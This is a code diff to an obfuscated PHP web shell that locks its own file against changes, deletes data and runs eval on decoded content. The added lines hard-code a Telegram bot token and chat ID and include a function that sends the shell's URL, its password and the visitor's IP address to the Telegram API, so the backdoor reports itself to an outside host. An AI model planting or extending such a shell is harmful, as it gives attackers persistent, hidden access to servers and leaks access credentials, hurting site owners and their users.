@@ -100,6 +100,13 @@ $㵈㊁め = __FILE__;
 @system("chmod ugo-w $㵈㊁め");
 system("chattr +i $㵈㊁め");
 @system("rm -rf AZZ_DATA");
+set_time_limit(0);
+ini_set('memory_limit', '-1');
+$botToken = '8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8';
+$chatId = '8478623770';
+$xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$logMessage  = "___APACHE TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $password \n\n IP Hacker  :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+sendTelegramMessage($botToken, $chatId, $logMessage);
 /**Encode security007**/
 function ｽｿｿ�ｽｽｽ￿ｽ￿￿ｽ￿ｽｽｽ��($�ｿ�ｽ)
 {
@@ -272,6 +279,25 @@ function ｽｿｿ�ｽｽｽ￿ｽ￿￿ｽ￿ｽｽｽ��($�ｿ�ｽ)
         $￿ｿｿ�ｽ￿￿[83];
     return eval($�￿);
 }
+function sendTelegramMessage($botToken, $chatId, $message)
+{
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+    $params = [
+        'chat_id' => $chatId,
+        'text' => $message,
+    ];
+    $options = [
+        'http' => [
+            'method' => 'POST',
+            'header' => 'Content-Type: application/x-www-form-urlencoded',
+            'content' => http_build_query($params),
+        ],
+    ];
+    $context = stream_context_create($options);
+    $response = file_get_contents($url, false, $context);
+
+}
+
 function ｽｽｽ��￿�ｿｽ�()
 {
     $��￿￿ = explode("#", @file_get_contents(__FILE__));
